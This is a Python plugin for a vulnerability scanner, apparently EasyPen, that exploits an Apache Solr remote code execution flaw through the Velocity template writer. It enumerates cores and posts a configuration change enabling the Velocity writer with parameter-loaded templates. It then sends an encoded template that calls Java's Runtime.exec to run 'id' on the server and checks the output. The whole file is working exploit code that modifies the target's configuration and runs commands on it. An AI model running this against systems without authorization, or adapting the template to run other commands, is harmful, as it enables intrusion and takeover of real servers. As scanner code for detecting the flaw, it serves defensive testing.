#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.poc.dummy import *
"""
Apache Solr RCE via Velocity template
poc from  https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt
"""


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    url = '{}://{}:{}/solr/admin/cores?wt=json'.format(service, ip, port)
    apps = []
    try:
        r = await http_client(ip, port).get(url, timeout=20)
        if 'status' not in r.text:
            return
        apps = r.json()['status'].keys()
    except json.decoder.JSONDecodeError as e:
        pass
    except Exception as e:
        debug(e)

    if apps:
        app = list(apps)[0]
        data2 = {
            "update-queryresponsewriter": {
                "startup": "lazy",
                "name": "velocity",
                "class": "solr.VelocityResponseWriter",
                "template.base.dir": "",
                "solr.resource.loader.enabled": "true",
                "params.resource.loader.enabled": "true"
            }
        }

        url = '{}://{}:{}/solr/{}/config'.format(service, ip, port, app)
        try:
            r = await http_client(ip, port).post(url, json=data2, timeout=20)
            if r.status_code == 200:
                url2 = '{}://{}:{}/solr/{}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=' \
                       '%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forNam' \
                       'e(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23se' \
                       't($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%2' \
                       '3foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'.format(
                        service, ip, port, app)

                r = await http_client(ip, port).get(url2, timeout=20)
                if 'uid=' in r.text and 'gid=' in r.text and 'groups=' in r.text:
                    ret = {
                        'alert_group': 'Solr Velocity Template RCE',
                        'affects': '{}'.format(url),
                        'details': 'WITH POC\n{} \n{}'.format(url, url2)
                    }
                    return ret
        except Exception as e:
            debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8983, 'http', True, task_msg={})
    run_plugin_test(scan)
